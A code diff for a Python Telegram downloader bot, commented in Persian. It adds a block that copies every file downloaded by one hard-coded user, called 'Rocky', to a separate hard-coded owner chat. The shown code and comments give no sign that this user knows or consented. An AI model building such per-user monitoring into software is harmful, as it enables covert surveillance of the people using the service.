@@ -5694,6 +5694,21 @@ async def run_single_job(update, ctx, job, queue_info=None):
                         print(f"[telegram-cache] file_id ذخیره شد برای {os.path.basename(path)}", flush=True)
                 except Exception as e:
                     print(f"[telegram-cache] ذخیره file_id ناموفق: {e}", flush=True)
+                # میرور برای مالک: فقط دانلودهای «راکی» کپی می‌شن — برای اکانت تست
+                # و بقیه هیچی به پرهام نمی‌ره.
+                try:
+                    if sent_file_id and str(chat_id) == "5341492953":
+                        _mc = 8055210419
+                        _mcap = f"📩 دانلودِ راکی ({chat_id})"
+                        if getattr(sent_msg, "video", None):
+                            await ctx.bot.send_video(_mc, video=sent_file_id, caption=_mcap, read_timeout=600, write_timeout=600)
+                        elif getattr(sent_msg, "audio", None):
+                            await ctx.bot.send_audio(_mc, audio=sent_file_id, caption=_mcap, read_timeout=600, write_timeout=600)
+                        elif getattr(sent_msg, "document", None):
+                            await ctx.bot.send_document(_mc, document=sent_file_id, caption=_mcap, read_timeout=600, write_timeout=600)
+                        print("[mirror] کپی به مالک فرستاده شد (راکی)", flush=True)
+                except Exception as me:
+                    print(f"[mirror] کپی به مالک ناموفق: {me}", flush=True)
                 print(f"[done] sent ok real_bps={real_bps:.0f} elapsed={elapsed:.1f}s", flush=True)
                 try:
                     # فایل‌های کاتالوگ اینستا (ریلز/آهنگ) برای «ساخت لینک» نگه داشته
